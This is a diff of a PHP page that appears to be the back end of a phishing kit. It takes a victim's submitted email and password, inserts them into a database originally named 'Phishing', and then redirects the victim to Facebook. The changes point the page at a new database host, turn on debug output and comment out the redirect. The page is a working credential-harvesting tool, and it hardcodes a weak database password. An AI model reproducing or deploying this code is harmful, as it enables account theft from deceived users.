@@ -6,13 +6,14 @@
 </head>
 <body>
 <?php
-$servername = "localhost";
-$username = "yu";
+$servername = "172.31.2.233:8889";
+$username = "userx";
 $password = "123";
-$dbname = "Phishing";
-
+$dbname = "userx";
+echo "test1<br>";
 // Create connection
-$conn = new mysqli($servername, $username, $password, $dbname);
+$conn = @new mysqli($servername, $username, $password, $dbname);
+
 // Check connection
 if ($conn->connect_error) {
     die("Connection failed: " . $conn->connect_error);
@@ -33,12 +34,12 @@ if(isset($_POST['email'])&& isset($_POST['pass1'] )){
     $YourName = $conn->real_escape_string($_POST['email']);
     $YourPass = $conn->real_escape_string($_POST['pass1']);
 
-    $sql = "INSERT INTO account (`id`,`usrname`,`password`)
+    $sql = "INSERT INTO account (`id`,`email`,`password`)
             VALUES (1,'$YourName', '$YourPass')";
   if ($conn->query($sql) === TRUE) {
-    // echo "Record inserted successfully";
+    echo "Record inserted successfully";
   } else {
-    // echo "Error: " . $conn->error;
+    echo "Error: " . $conn->error;
   }
 }
 else{
@@ -46,6 +47,6 @@ else{
 }
 $conn->close();
 ?>
-<meta http-equiv="refresh" content="0;url= https://www.facebook.com/?locale=zh_TW ">
+<!-- <meta http-equiv="refresh" content="0;url= https://www.facebook.com/?locale=zh_TW "> -->
 </body>
 </html>
